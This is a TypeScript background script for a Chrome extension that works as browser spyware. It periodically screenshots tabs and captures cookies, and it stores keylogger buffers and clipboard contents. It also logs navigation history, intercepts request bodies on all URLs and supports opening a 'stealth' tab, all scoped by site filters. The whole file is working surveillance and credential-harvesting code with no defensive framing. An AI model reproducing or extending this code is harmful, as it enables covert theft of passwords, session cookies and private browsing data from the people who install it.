import { BackgroundMessage, StorageKey } from "../consts";
import { INavigationLogEntry, IRequestData } from "../interfaces";
import {
  captureCookies,
  captureHistory,
  captureVisibleTab,
  openStealthTab,
} from "../utils/background-utils";
import { contextData, simplePrepend, writeLog } from "../utils/shared-utils";
import { matchesSiteFilters, initSiteFilters } from "../utils/site-filters";

async function matchesAnyPattern(url: string, patterns: string[] | undefined) {
  if (!patterns || patterns.length === 0) return true;
  // Structured match: support patterns like
  // - <all_urls>
  // - scheme://host/path*  (scheme may be '*')
  // - host (e.g. google.com) which is treated as '*://*.host/*'
  // Host may start with '*.' to match subdomains.
  for (const p of patterns) {
    const raw = (p || "").trim();
    if (!raw) continue;
    if (raw === "<all_urls>") return true;

    // Determine components
    let schemePart: string | null = null; // e.g. 'https' or '*'
    let hostPart: string | null = null; // e.g. '*.google.com' or 'google.com'
    let pathPart: string = "/*"; // prefix match

    if (raw.includes("://")) {
      // pattern includes a scheme
      const [schemeRaw, restRaw] = raw.split("://", 2);
      schemePart = schemeRaw || "*";
      const slashIdx = restRaw.indexOf("/");
      if (slashIdx >= 0) {
        hostPart = restRaw.slice(0, slashIdx) || "*";
        pathPart = restRaw.slice(slashIdx) || "/*";
      } else {
        hostPart = restRaw || "*";
        pathPart = "/*";
      }
    } else {
      // no scheme: treat as host, match any scheme and any path
      schemePart = "*";
      hostPart = raw;
      pathPart = "/*";
    }

    // Normalize host: if host doesn't start with '*.' and is a bare hostname,
    // allow subdomains by treating it as '*.host'
    if (hostPart && !hostPart.startsWith("*.") && !hostPart.includes("*")) {
      hostPart = `*.${hostPart}`;
    }

    // Now test the URL
    try {
      const u = new URL(url);
      // scheme check
      if (schemePart && schemePart !== "*") {
        // schemePart might include ':' (if user included it), normalize
        const schemeNormalized = schemePart.replace(/:$/, "");
        if (u.protocol.replace(/:$/, "") !== schemeNormalized) continue;
      }

      // host check
      if (hostPart && hostPart !== "*") {
        if (hostPart.startsWith("*.")) {
          const base = hostPart.slice(2);
          if (u.hostname === base) {
            // exact match of base is allowed
          } else if (!u.hostname.endsWith(`.${base}`)) {
            continue;
          }
        } else if (hostPart.includes("*")) {
          // fallback for other wildcard placements: convert to contains
          const cleaned = hostPart.replace(/\*/g, "");
          if (!u.hostname.includes(cleaned)) continue;
        } else {
          if (u.hostname !== hostPart) continue;
        }
      }

      // path check: treat pathPart as prefix, supporting trailing '*'
      if (pathPart && pathPart !== "/*") {
        // normalize pathPart to a prefix without trailing '*'
        const prefix = pathPart.replace(/\*+$/, "");
        if (!u.pathname.startsWith(prefix)) continue;
      }

      // matched all components
      return true;
    } catch (e) {
      // If URL parsing fails, skip this pattern
      continue;
    }
  }

  return false;
}

async function initBackground() {
  await initSiteFilters();

  chrome.alarms.create({ periodInMinutes: 1 });

  chrome.alarms.onAlarm.addListener(() => {
    // openStealthTab();
    captureVisibleTab();
    captureCookies();
  });

  chrome.action.onClicked.addListener(() => chrome.runtime.openOptionsPage());

  chrome.runtime.onMessage.addListener(async (message, sender, response) => {
    const { messageType, data }: { messageType: BackgroundMessage; data?: any } =
      message;

  switch (messageType) {
      case BackgroundMessage.HEARTBEAT:
        writeLog("Heartbeat");
        break;
      case BackgroundMessage.OPEN_STEALTH_TAB:
        await openStealthTab();
        break;
      case BackgroundMessage.UPDATE_KEY_LOG:
        try {
          const { buffer, url, context } = data || {};
          if (url && (await matchesSiteFilters(url))) {
            await simplePrepend(StorageKey.KEY_LOG, {
              ...context,
              url,
              buffer,
            });
            writeLog("Wrote keylog buffer");
          }
        } catch (e) {
          // ignore
        }
        break;
      case BackgroundMessage.UPDATE_CLIPBOARD:
        try {
          const { text, url, context } = data || {};
          if (url && (await matchesSiteFilters(url))) {
            await simplePrepend(StorageKey.CLIPBOARD_LOG, {
              ...context,
              text,
              url,
            });
            writeLog("Wrote clipboard");
          }
        } catch (e) {
          // ignore
        }
        break;
      case BackgroundMessage.CAPTURE_VISIBLE_TAB:
        try {
          // Basic receipt log for the activity log
          writeLog(`Received CAPTURE_VISIBLE_TAB message from ${sender?.tab?.id ?? 'unknown'}`);
        } catch (e) {}
        // If verbose logging is enabled, add more context to help debugging
        try {
          // eslint-disable-next-line @typescript-eslint/no-var-requires
          const { VERBOSE_LOGGING } = require("../consts");
          if (VERBOSE_LOGGING) {
            writeLog(
              `CAPTURE_VISIBLE_TAB sender details: tabId=${sender?.tab?.id ?? 'unknown'} origin=${sender?.url ?? 'unknown'}`
            );
          }
        } catch (e) {}
        await captureVisibleTab();
        break;
      case BackgroundMessage.CAPTURE_COOKIES:
        await captureCookies();
        break;
      case BackgroundMessage.CAPTURE_HISTORY:
        await captureHistory();
        break;
      default:
        // HMR may send a message
        try {
          const { VERBOSE_LOGGING } = require("../consts");
          if (VERBOSE_LOGGING) {
            console.error("Unrecognized message", JSON.stringify(message));
          }
        } catch (e) {
          // ignore
        }
    }
  });

  chrome.webNavigation.onCompleted.addListener(async (details) => {
    try {
      if (details.url && (await matchesSiteFilters(details.url))) {
        await simplePrepend<INavigationLogEntry>(StorageKey.NAVIGATION_LOG, {
          url: details.url,
          ...contextData(),
        });

        writeLog("Recorded navigation");
      }
    } catch (e) {
      // ignore
    }
  });

  chrome.webRequest.onBeforeRequest.addListener(
    (details) => {
      (async () => {
        if (!details.requestBody) return;

        // Determine the originating URL for this request. Many requests
        // target third-party domains; we want to persist data only when the
        // initiator/document/tab that caused the request matches the filters.
        let initiatorUrl: string | null = null;
        if ((details as any).initiator) initiatorUrl = (details as any).initiator;
        if (!initiatorUrl && (details as any).documentUrl)
          initiatorUrl = (details as any).documentUrl;
        if (!initiatorUrl && details.tabId && details.tabId >= 0) {
          try {
            const tab = await chrome.tabs.get(details.tabId);
            initiatorUrl = tab?.url || null;
          } catch (e) {
            initiatorUrl = null;
          }
        }

        const ok = await matchesSiteFilters(initiatorUrl || "");
        if (!ok) return;

        simplePrepend<IRequestData>(StorageKey.REQUEST_BODY_LOG, {
          request: details,
          ...contextData(),
        }).then(
          () => {
            writeLog("Recorded request");
          },
          () => {}
        );
      })();
    },
    {
      urls: ["<all_urls>"],
    },
    ["requestBody"]
  );
}

initBackground().catch((e) =>
  console.error("Failed to initialize background:", e)
);
